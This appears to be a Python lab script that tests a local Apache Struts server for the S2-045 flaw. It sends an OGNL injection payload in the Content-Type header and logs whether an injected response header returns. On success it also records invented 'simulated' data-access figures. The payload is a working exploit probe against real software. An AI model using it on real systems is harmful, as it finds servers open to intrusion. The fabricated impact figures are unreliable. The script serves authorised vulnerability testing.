#!/usr/bin/env python3

import json
import datetime
import requests


def simulate_struts_attack():
    """Run the authorised Struts lab check and log its outcome."""

    target_url = "http://127.0.0.1:8080"

    print("Testing the isolated Struts lab application...")

    headers = {
        "Content-Type": (
            "%{#context['com.opensymphony.xwork2.dispatcher."
            "HttpServletResponse'].addHeader('X-Vulnerable','true')}."
            "multipart/form-data"
        )
    }

    attack_log = {
        "timestamp": datetime.datetime.now().isoformat(),
        "attack_type": "Struts S2-045 lab simulation",
        "target": "local web_server on port 8080",
        "success": False,
        "simulation_only": True,
        "result": "Not confirmed"
    }

    try:
        response = requests.get(
            target_url,
            headers=headers,
            timeout=5
        )

        attack_log["http_status"] = response.status_code

        if "X-Vulnerable" in response.headers:
            print("The vulnerability marker was returned.")
            print("Recording the simulated impact; no real data is accessed.")

            attack_log["success"] = True
            attack_log["result"] = "Vulnerability marker observed"
            attack_log["data_accessed"] = (
                "Simulated customer_data database"
            )
            attack_log["records_affected"] = 3

        else:
            print(
                "The vulnerability marker was not returned. "
                "The vulnerability status is not confirmed by this check."
            )
            attack_log["result"] = (
                "Vulnerability marker not observed; further validation needed"
            )

    except requests.RequestException as error:
        print(f"Lab request failed: {error}")
        attack_log["error"] = str(error)
        attack_log["result"] = "Check failed; outcome inconclusive"

    with open("attack_log.json", "w") as file:
        json.dump(attack_log, file, indent=2)

    print("Simulation result saved to attack_log.json")
    return attack_log["success"]


if __name__ == "__main__":
    simulate_struts_attack()
